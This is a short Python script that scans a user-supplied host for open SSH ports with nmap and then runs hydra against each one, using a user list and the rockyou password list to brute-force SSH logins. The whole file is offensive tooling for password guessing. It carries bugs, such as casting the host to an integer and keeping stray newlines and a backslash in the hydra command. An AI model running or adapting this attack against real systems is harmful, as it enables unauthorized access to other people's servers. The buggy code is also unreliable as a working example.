import os

host = int(input("Enter your Host (host/cldr num):"))
one = '| grep "/open" '
two = "| awk '{ print $2 }'"
os.system(f"nmap --open -p 22 {host} -oG - {one} {two}  >> ssh.txt")

ssh = open("ssh.txt",'r')
for account in ssh:
#    os.system("hydra -L users.txt -P passwords.txt ssh://172.16.1.102 -t 4")
    os.system(f"hydra -L users.txt -P rockyou.txt ssh://{account} \ -t 4")
#    print(f'hydra -L users.txt -P rockyou.txt ssh://{account} \ -t 4')
